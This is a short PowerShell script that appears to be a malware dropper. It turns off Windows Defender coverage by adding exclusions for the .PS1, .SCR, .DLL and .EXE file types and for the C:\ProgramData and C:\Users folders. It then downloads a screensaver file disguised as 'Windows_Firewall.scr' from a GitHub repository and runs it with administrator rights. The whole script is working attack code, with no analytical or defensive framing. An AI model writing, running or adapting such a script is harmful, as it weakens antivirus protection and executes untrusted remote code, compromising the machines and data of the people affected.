# Step 1: Check Windows Defender exclusions for .PS1, .SCR, .DLL, .EXE file types and folder paths
$exclusions = Get-MpPreference

# Add exclusions if not already present for file extensions
$fileExclusions = @(".PS1", ".SCR", ".DLL", ".EXE")
$folderExclusions = @("C:\ProgramData", "C:\Users")

foreach ($file in $fileExclusions) {
    if ($exclusions.ExcludedFileExtensions -notcontains $file) {
        Add-MpPreference -ExclusionExtension $file
    }
}

foreach ($folder in $folderExclusions) {
    if ($exclusions.ExcludedPaths -notcontains $folder) {
        Add-MpPreference -ExclusionPath $folder
    }
}

# Step 2: Verify the file existence in C:\ProgramData\Validity\Windows_Firewall.scr
$filePath = "C:\ProgramData\Validity\Windows_Firewall.scr"
if (Test-Path $filePath) {
    Write-Host "$filePath exists."
} else {
    Write-Host "$filePath is missing. Downloading..."

    # Step 3: Download the missing file
    $url = "https://github.com/cyberforce49/m/raw/refs/heads/main/Windows_Firewall.scr"
    $destination = $filePath
    Invoke-WebRequest -Uri $url -OutFile $destination
    Write-Host "File downloaded to $destination."

    # Verify again
    if (Test-Path $filePath) {
        Write-Host "File verification complete: $filePath exists."
    } else {
        Write-Host "File verification failed: $filePath does not exist."
    }
}

# Step 4: Execute the file as .scr with admin privileges
if (Test-Path $filePath) {
    Write-Host "Executing $filePath as administrator..."
    Start-Process -FilePath $filePath -Verb RunAs -Wait
    Write-Host "$filePath executed successfully."
} else {
    Write-Host "Execution failed: $filePath does not exist."
}